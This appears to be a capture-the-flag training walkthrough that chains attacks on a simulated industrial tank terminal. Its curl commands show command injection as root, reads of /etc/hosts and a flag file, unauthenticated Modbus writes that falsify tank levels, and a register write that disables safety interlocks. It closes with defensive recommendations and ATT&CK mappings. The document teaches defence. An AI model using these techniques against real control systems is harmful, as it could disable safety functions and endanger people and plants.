    Exercise ICS-3.1: ICS Attack Chain: Chaining the Kill

    Engagement Status

    Reconnaissance Protocol Analysis Exploitation Attack Chaining Defense Analysis

    Objective

    Difficulty: Advanced | Duration: ~40 minutes

    Chain the individual vulnerabilities discovered across exercises 1.1 through 2.3 into a single, multi-stage attack that moves from the IT-facing gateway into the OT environment: manipulating physical process values and corrupting the historian database. Assemble a two-part flag along the way.

    Goal

    Execute a complete ICS kill chain: gain initial access through the RemoteView Gateway, pivot into the Modbus control plane, manipulate process registers, trigger the maintenance override, and correlate evidence in the historian to assemble the flag.

    Background

    The ICS Kill Chain

    Traditional IT kill chains (Lockheed Martin Cyber Kill Chain) describe attacks that end at data exfiltration. ICS attacks go further: the ultimate objective is impact on the physical process. MITRE developed the ATT&CK for ICS framework specifically for these environments, defining 12 tactics that trace an adversary's path from initial reconnaissance to physical destruction or disruption.

    The key tactics relevant to this exercise:

    # Tactic Description This Exercise
    1 Initial Access Entry into the ICS network Gateway command injection
    2 Execution Running adversary code OS command execution via API
    3 Persistence Maintaining access Not covered (single session)
    4 Discovery Learning the environment Internal network enumeration
    5 Lateral Movement Moving between systems Gateway to Modbus to historian
    6 Collection Gathering target data Reading registers and DB records
    7 Command and Control Communication channel API as C2 proxy
    8 Inhibit Response Function Disabling safety Maintenance override (reg 50)
    9 Impair Process Control Disrupting operations Manipulating tank readings
    10 Impact Physical consequence Falsified sensor data

    Real-World Parallels

    Stuxnet (2010): The most famous ICS attack targeted Iranian uranium enrichment centrifuges. It crossed the air gap via USB, infected Siemens Step 7 engineering workstations, and injected malicious ladder logic into PLCs. The centrifuges spun outside safe parameters while the HMI displayed normal readings. The attack chain: IT compromise → engineering workstation → PLC code injection → physical damage.

    TRITON / TRISIS (2017): Targeted the Triconex Safety Instrumented System (SIS) at a petrochemical plant in Saudi Arabia. The attackers moved through the IT network, reached an engineering workstation, and attempted to disable the safety controller that prevents catastrophic failures. Had it succeeded, it could have allowed a simultaneous process attack to cause an explosion without the SIS shutting down the plant.

    Ukraine Power Grid (2015/2016): Attackers gained initial access through spear-phishing emails with malicious Word documents. Over months, they moved laterally through the IT network, harvested VPN credentials, reached the SCADA systems, and remotely opened breakers at three power distribution companies, cutting power to approximately 230,000 customers. They also attacked the UPS systems and call center to inhibit response.

    Living Off the Land in ICS

    A critical concept in ICS attacks is "living off the land": using legitimate protocols and tools rather than custom malware. Modbus TCP has no authentication. Writing a value to a holding register is a normal, expected operation. There is no way for the PLC to distinguish between a legitimate write from the HMI and a malicious write from an attacker. The protocol itself is the weapon.

    In this exercise, every action you take uses legitimate functionality: HTTP API calls, standard Modbus read/write operations, and PostgreSQL queries. No exploits, no shellcode, no malware: just protocols doing exactly what they were designed to do, wielded by an unauthorized party.

    Walkthrough

    Phase 1: Initial Access: Gateway Discovery

    The RemoteView Gateway is the IT-facing component that bridges the corporate network to the OT environment. In a real facility, this would be a remote monitoring appliance or VPN concentrator. At Hex Point Bay Terminal, it exposes an HTTP API on port 8080.

    Step 1: Discover the RemoteView Gateway

    Confirm the gateway is reachable and identify what it serves.

    curl -s http://gateway.hexpoint.local:8080/
    Expected output 
    {"service": "RemoteView Gateway", "version": "1.2.0", "status": "online"}

    The gateway identifies itself by name and version. In a real engagement, this banner disclosure alone is a finding: it tells an attacker exactly what software to research for known vulnerabilities.

    Step 2: Explore the API Documentation

    Check whether the API documentation endpoint is accessible.

    curl -s http://gateway.hexpoint.local:8080/api/docs
    Expected output

    The documentation reveals available endpoints, including /api/read/<tank_id>, /api/write, /api/status, and /api/config. It also discloses the hardcoded API key HPB-GW-2024-DEMO used for write operations.

    MITRE ATT&CK for ICS: Discovery (TA0102)

    Accessing API documentation to learn about available control endpoints maps directly to the Discovery tactic. In real attacks, adversaries study engineering documentation, HMI screens, and protocol specifications to understand the process they intend to manipulate.

    Step 3: Query the Status Endpoint

    curl -s http://gateway.hexpoint.local:8080/api/status
    Expected output 
    {
  "gateway": "online",
  "modbus_target": "sim.hexpoint.local:502",
  "tanks_monitored": ["TANK-1", "TANK-2", "TANK-3", "TANK-4"],
  "last_poll": "2024-01-15T14:32:00Z"
}

    The status endpoint discloses the internal Modbus target address. The disclosed address is the pivot point: the gateway can reach the simulator directly.

    Step 4: Access the Config Endpoint: Flag Fragment 1

    curl -s http://gateway.hexpoint.local:8080/api/config
    Expected output

    The configuration response includes internal network details, polling intervals, and embedded in the configuration data, the first flag fragment.

    Record this fragment. You will combine it with the second fragment at the end of the exercise.

    Fragment 1 acquired from the gateway config endpoint.

    Phase 2: Exploitation: Command Injection

    The gateway's /api/read/<tank_id> endpoint passes the tank ID directly into a system command without sanitization. The unsanitized endpoint is the same command injection vulnerability identified in Exercise 2.2, but now you will use it as a pivot point rather than an end goal.

    Step 5: Test Command Injection

    Verify the injection works by appending a simple command.

    curl -s "http://gateway.hexpoint.local:8080/api/read/TANK-1;id"
    Expected output 
    uid=0(root) gid=0(root) groups=0(root)

    The gateway process runs as root: a critical finding. Any command you inject executes with full system privileges.

    Impact

    Command injection running as root on a gateway appliance that bridges IT and OT networks is a worst-case scenario. The attacker inherits the gateway's network position and permissions.

    Step 6: Read the Gateway's Local Flag

    While not part of the attack chain flag, confirm full file system access.

    curl -s "http://gateway.hexpoint.local:8080/api/read/TANK-1;cat%20/flag.txt"
    Expected output 
    OCR{...gateway_flag...}

    The printed token is the gateway's own flag from Exercise 2.2. You already have it: the point here is confirming arbitrary command execution works.

    Step 7: Enumerate the Internal Network

    Use the gateway's position to discover what other hosts it can reach.

    curl -s "http://gateway.hexpoint.local:8080/api/read/TANK-1;cat%20/etc/hosts"
    Expected output 
    127.0.0.1   localhost
<lab_subnet>.10  sim.hexpoint.local
<lab_subnet>.11  hmi.hexpoint.local
<lab_subnet>.12  historian.hexpoint.local
<lab_subnet>.13  gateway.hexpoint.local
<lab_subnet>.14  docs.hexpoint.local

    The gateway has DNS-level knowledge of every host in the OT network. An attacker now has a complete map.

    MITRE ATT&CK for ICS: Discovery (TA0102)

    Enumerating the internal network from a compromised gateway mirrors real-world ICS attacks where adversaries map SCADA/DCS networks from engineering workstations.

    Step 8: Read Modbus Registers Through the Gateway

    The gateway's legitimate function is reading Modbus registers. Use the API as designed: no injection needed.

    curl -s "http://gateway.hexpoint.local:8080/api/read/TANK-1"
curl -s "http://gateway.hexpoint.local:8080/api/read/TANK-2"
    Expected output 
    {"tank_id": "TANK-1", "level": 7500, "temperature": 68, "status": "normal"}
{"tank_id": "TANK-2", "level": 4200, "temperature": 72, "status": "warning"}

    Note that TANK-2 already shows anomalous readings: this is the evidence of the prior unauthorized access from 10.0.0.99 that you identified in the historian during Exercise 2.3.

    Phase 3: Lateral Movement: Modbus Manipulation

    The gateway exposes a write endpoint at /api/write. During Exercise 2.2, you discovered that the API key check is broken: the endpoint accepts requests regardless of whether a valid key is provided.

    Step 9: Write to Tank Registers via the Gateway

    Demonstrate that the broken authentication allows unauthorized writes.

    curl -s -X POST http://gateway.hexpoint.local:8080/api/write \
  -H "Content-Type: application/json" \
  -d '{"tank_id": "TANK-2", "register": "level", "value": 9999}'
    Expected output 
    {"status": "success", "tank_id": "TANK-2", "register": "level", "value": 9999}

    MITRE ATT&CK for ICS: Impair Process Control (TA0106)

    You have just falsified a tank level reading. If this were a real terminal, operators would see an incorrect level on the HMI and could make dangerous operational decisions: such as continuing to fill a tank that appears nearly empty but is actually near capacity.

    Step 10: Simulate the Original Attack

    Replicate what the unauthorized source (10.0.0.99) did: write anomalous values to TANK-2.

    curl -s -X POST http://gateway.hexpoint.local:8080/api/write \
  -H "Content-Type: application/json" \
  -d '{"tank_id": "TANK-2", "register": "level", "value": 4200}'

    Verify the manipulation took effect by reading the register back.

    curl -s "http://gateway.hexpoint.local:8080/api/read/TANK-2"

    You have now demonstrated the complete attack path: IT access (gateway API) → command execution → OT manipulation (Modbus register writes). The chained path is exactly how the original attacker compromised TANK-2 readings.

    Step 11: Trigger the Maintenance Override

    The most dangerous action: writing the magic value 31337 to register 50 activates the maintenance override, which disables safety interlocks on the tank monitoring system.

    curl -s -X POST http://gateway.hexpoint.local:8080/api/write \
  -H "Content-Type: application/json" \
  -d '{"tank_id": "SYSTEM", "register": 50, "value": 31337}'
    Expected output 
    {"status": "success", "register": 50, "value": 31337, "warning": "maintenance_override_active"}

    MITRE ATT&CK for ICS: Inhibit Response Function (TA0107)

    Activating the maintenance override is analogous to what TRITON attempted: disabling the Safety Instrumented System. With interlocks disabled, the physical process has no automated safety net. Overfills, temperature excursions, and pressure buildups would not trigger automatic shutdowns.

    Reset the Override

    After confirming the override activates, reset it to prevent disrupting other students.

    curl -s -X POST http://gateway.hexpoint.local:8080/api/write \
  -H "Content-Type: application/json" \
  -d '{"tank_id": "SYSTEM", "register": 50, "value": 0}'

    Phase 4: Evidence & Flag Assembly

    The attack chain is complete. Now correlate the evidence across systems to assemble the final flag.

    Step 12: Connect to the Historian Database

    The historian recorded every register change: including the ones you just made.

    psql -h historian.hexpoint.local -U historian -d terminal_data -c \
  "SELECT timestamp, source_ip, action, details FROM operator_log ORDER BY timestamp DESC LIMIT 10;"

    When prompted for the password, enter hex_point_2024.

    Expected output 
         timestamp        |  source_ip   |    action     |              details
----------------------+--------------+---------------+-----------------------------------
 2024-01-15 14:45:00  | <your_ip>    | register_write | SYSTEM reg50=31337 (override)
 2024-01-15 14:44:30  | <your_ip>    | register_write | TANK-2 level=4200
 2024-01-15 14:44:00  | <your_ip>    | register_write | TANK-2 level=9999
 ...

 2024-01-14 02:45:00  | 10.0.0.99    | register_write | TANK-2 level=8500 (ANOMALY)

    Your actions appear alongside the original attacker's entries. The historian cannot distinguish between the two: both used legitimate Modbus operations through the gateway.

    Step 13: Correlate the Attack Evidence

    Query for the specific attack evidence that connects the gateway to the historian.

    psql -h historian.hexpoint.local -U historian -d terminal_data -c \
  "SELECT source_ip, action, details FROM operator_log WHERE source_ip = '10.0.0.99';"
    Expected output

    The query returns the unauthorized entries from 10.0.0.99: the original attacker. These entries prove the attack chain: the adversary came through the gateway (IT-facing) and manipulated registers that the historian (OT data store) recorded.

    The attack path is clear: Gateway (initial access, command injection, broken auth) → Modbus simulator (register manipulation) → Historian (evidence recorded). The flag reflects this chain.

    Step 14: Assemble the Complete Flag

    You have both pieces of the puzzle:

    • Fragment 1 from the gateway /api/config: look for the flag fragment in the config response
    • Fragment 2 derived from the attack chain evidence: correlate the gateway compromise with what was recorded in the historian

    Combine the fragments:

    echo "<fragment1><fragment2>"

    Combine both fragments and submit in the platform to complete Exercise ICS-3.1.

    Analysis Questions

    Q1: How did IT vulnerabilities chain into OT impact?

    Answer

    The attack chain exploited three IT-class vulnerabilities in sequence: (1) information disclosure on the /api/docs and /api/config endpoints revealed the API key and internal network topology, (2) command injection on /api/read/<tank_id> provided arbitrary OS command execution on the gateway, and (3) broken API key authentication on /api/write allowed unauthorized Modbus register writes. None of these are OT-specific vulnerabilities: they are standard web application flaws. But because the gateway bridges IT and OT networks, these IT vulnerabilities directly enabled manipulation of the physical process (tank levels) and disabling of safety interlocks (maintenance override). The OT protocols themselves (Modbus TCP) have no authentication, so once the attacker reached the control network, there was no further barrier.

    Q2: Map your attack to MITRE ATT&CK for ICS tactics.

    Answer
    Step ATT&CK for ICS Tactic Technique
    API discovery, /api/docs Discovery (TA0102) Remote System Information Discovery
    Command injection Execution (TA0104) Command-Line Interface
    /etc/hosts enumeration Discovery (TA0102) Network Connection Enumeration
    Modbus register reads Collection (TA0100) Point & Tag Identification
    Register writes (TANK-2) Impair Process Control (TA0106) Modify Parameter
    Register 50 override Inhibit Response Function (TA0107) Modify Alarm Settings
    Historian correlation Collection (TA0100) Program Upload
    Overall impact Impact (TA0105) Manipulation of View / Loss of Safety

    Q3: What single defensive measure would best break this chain?

    Answer

    Network segmentation with a properly configured firewall between IT and OT zones. If the gateway API (IT-facing, port 8080) were on a separate network segment from the Modbus control plane (OT, port 502), command injection on the gateway would not grant access to the simulator's Modbus registers. The attacker could compromise the gateway completely but could not pivot to OT systems. Segmentation is the principle behind the Purdue Model: Level 3 (site operations) should not have direct connectivity to Level 1 (control systems) without passing through a demilitarized zone (DMZ) with strict firewall rules and protocol-aware inspection.

    Q4: How does this compare to real-world ICS attacks?

    Answer

    This exercise mirrors the structure of the Ukraine power grid attacks (2015/2016). In both cases: (1) initial access was through an IT vulnerability (spear-phishing in Ukraine, command injection here), (2) the attackers moved laterally from IT to OT networks using legitimate access paths (VPN credentials in Ukraine, gateway API here), (3) the final impact was achieved using legitimate protocols (opening breakers via SCADA in Ukraine, Modbus writes here), and (4) the attackers also targeted response capabilities (call center DoS in Ukraine, maintenance override here). The key difference is scale and sophistication: the Ukraine attackers spent months inside the network, while this exercise compresses the kill chain into a single session. Stuxnet was even more sophisticated, injecting malicious PLC code rather than just writing register values, and it included rootkit components to hide the modifications from the engineering workstations.

    Defensive Recommendations

    The following table maps each attack phase to the defensive measures that would have prevented or detected it.

    Attack Phase Vulnerability Exploited Countermeasure Priority
    Initial Access API documentation publicly accessible Require authentication for all API endpoints; disable /api/docs in production High
    Initial Access Config endpoint leaks internal topology Remove sensitive data from API responses; implement role-based access High
    Execution Command injection in /api/read Input validation and parameterized queries; never pass user input to shell commands Critical
    Execution Gateway runs as root Run services with least-privilege accounts; use containers with dropped capabilities High
    Lateral Movement Broken API key authentication Implement proper authentication (mutual TLS, OAuth2); rotate API keys regularly Critical
    Process Manipulation Modbus TCP has no authentication Deploy Modbus-aware firewalls; implement allowlists for register writes; use OPC UA with authentication where possible Critical
    Safety Override Register 50 writable from network Physical key switch for maintenance override; require dual authorization for safety-critical changes Critical
    Evidence Historian accessible with weak credentials Strong passwords; network ACLs limiting historian access to authorized HMI/SCADA sources only High
    Detection No alerting on anomalous writes Deploy ICS-aware IDS (e.g., Claroty, Dragos, Nozomi); alert on Modbus writes from non-HMI sources High
    Overall Flat network: all systems reachable Implement Purdue Model segmentation with DMZ between IT and OT; protocol-aware firewalls at each boundary Critical

    Key Takeaways

    • ICS attacks chain IT vulnerabilities to achieve OT impact. The Modbus protocol is not "vulnerable": it is functioning as designed. The vulnerabilities that enabled the attack were all in the IT layer (web application flaws, broken authentication).

    • Legitimate protocols are the weapon. Every Modbus write in this exercise was a valid protocol operation. ICS-aware network monitoring must baseline normal behavior and alert on deviations: source IPs, write frequencies, register ranges, and value bounds.

    • Defense-in-depth is not optional in ICS. A single missing control (input validation, API authentication, network segmentation) was enough to enable the entire chain. Real ICS security requires overlapping layers so that no single failure is catastrophic.

    • The kill chain model helps defenders prioritize. By mapping attacks to frameworks like MITRE ATT&CK for ICS, defenders can identify which phase to break. The cheapest intervention is usually at the IT/OT boundary: proper segmentation eliminates entire categories of lateral movement.

    • Safety and security are intertwined. The maintenance override (register 50) is a safety function. Compromising it through a cyber attack demonstrates that cybersecurity failures can directly cause physical safety incidents: a principle that drives regulations like IEC 62443 and NERC CIP.
